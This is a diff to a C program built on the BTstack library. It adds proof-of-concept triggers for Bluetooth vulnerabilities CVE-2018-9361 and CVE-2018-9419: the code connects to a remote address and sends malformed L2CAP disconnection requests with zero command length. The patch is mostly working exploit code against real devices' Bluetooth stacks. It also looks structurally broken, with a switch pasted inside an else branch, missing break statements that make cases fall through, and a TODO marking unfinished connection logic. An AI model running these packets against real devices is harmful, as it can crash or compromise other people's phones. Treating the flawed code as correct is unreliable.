@@ -140,6 +140,21 @@ static void CVE_2019_2009_handler(uint8_t packet_type, uint16_t channel, uint8_t
         printf("[*] CVE_2019_2009_handler event: 0x%x", event);
     }
 }
+/*
+ * Made some modifications in src/l2cap_signaling.c to add
+ * DISCONNECTION_REQUEST_FUZZ which sets the cmd length to 0
+ * and cmd code to DISCONNECTION_REQUEST
+ */
+
+static void do_CVE_2018_9361() {
+    uint8_t status = l2cap_create_channel(l2cap_packet_handler, remote_addr, BLUETOOTH_PROTOCOL_SDP, l2cap_max_mtu(), NULL);
+    printf("Status: %d\n", status);
+}
+
+static void do_CVE_2018_9419(int psm) {
+    uint8_t status = gap_connect(remote_addr, 1);
+    printf("Status: %d\n", status);
+}
 
 static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
 {
@@ -218,6 +233,30 @@ static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packe
         }
         else
         {
+    switch (event) {
+        case BTSTACK_EVENT_STATE:
+            // BTstack activated, get started 
+            if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING){
+                // Not fully needed for CVE-2018-9361, we just need to get a connection started
+                // TODO: Pull out the nessesary HCI commands that get run for creating a connection
+                // and create a method to just trigger a HCI_EVENT_CONNECTION_COMPLETE
+                // l2cap.c:l2cap_create_channel_entry -> hci_send_cmd(&hci_create_connection, channel->address, hci_usable_acl_packet_types(), 0, 0, 0, 1)
+                // Need to hook into l2cap send loop
+            }
+            break;
+        case HCI_EVENT_CONNECTION_COMPLETE:
+            handle = hci_event_connection_complete_get_connection_handle(packet);
+            printf("Connection complete (handle: %d)\n", handle);
+
+            // CVE-2018-9361
+            l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
+                l2cap_next_sig_id());
+        case HCI_EVENT_LE_META:
+            // CVE_2018_9419
+            handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
+            l2cap_send_le_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
+                l2cap_next_sig_id());
+        default:
             printf("packet_handler: 0x%x\n", event);
         }
         break;
